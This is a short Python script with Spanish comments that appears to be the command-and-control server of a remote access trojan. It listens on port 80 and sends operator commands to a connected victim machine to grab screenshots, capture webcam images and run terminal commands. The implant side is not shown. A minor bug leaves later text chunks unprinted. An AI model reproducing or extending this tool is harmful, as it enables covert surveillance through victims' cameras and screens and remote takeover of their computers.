#crear nuestro servidor

from socket import socket,AF_INET,SOCK_STREAM


def recibir_archivo(nombre):
    data = usuario.recv(1000000)
    pos_guion = data.index(ord('-'))
    size = int(data[:pos_guion].decode())#obtengo el tamaño
    data_foto = data[pos_guion+1:]#obtener los datos restantes si es que hay
    size_recv = len(data_foto)#tamaño de lsod atos que voy recibiendo
    f = open(nombre,'wb')
    f.write(data_foto)

    while size_recv < size:
        data = usuario.recv(4096)
        f.write(data)
        size_recv += len(data)            
    f.close()

def recibir_texto():
    data = usuario.recv(1000000)
    pos_guion = data.index(ord('-'))
    size = int(data[:pos_guion].decode())#obtengo el tamaño
    data = data[pos_guion+1:]#obtener los datos restantes si es que hay
    size_recv = len(data)#tamaño de lsod atos que voy recibiendo
    try:
        data_str = data.decode()
    except UnicodeDecodeError:
        data_str  = data.decode('windows-1252')
    print(data_str)    
    while size_recv < size:
        data = usuario.recv(4096)
        try:
            data_str = data.decode()
        except UnicodeDecodeError:
            data_str  = data.decode('windows-1252')
            
        size_recv += len(data)            
HOST = '10.128.0.3'
PORT =  80

conexion = socket(AF_INET,SOCK_STREAM)
conexion.bind((HOST,PORT))
print("ESTOY A LA ESCUCHA")
conexion.listen(1)
usuario,info_usuario = conexion.accept()

while True:

    comando = input("Enter command: ")

    comando_enviar = comando.strip().encode()

    usuario.sendall(comando_enviar)

    if comando == 'exit':
        break
    elif comando == 'screenshot':
        recibir_archivo('screenshot_recibido.png')
    elif comando == 'camera':
        recibir_archivo('camera_recibido.png')

    elif comando.startswith('cmd '):#ejecutar en la terminal
        recibir_texto()
    else:
        print("Has ingresado un comando incorrecto")



conexion.close()
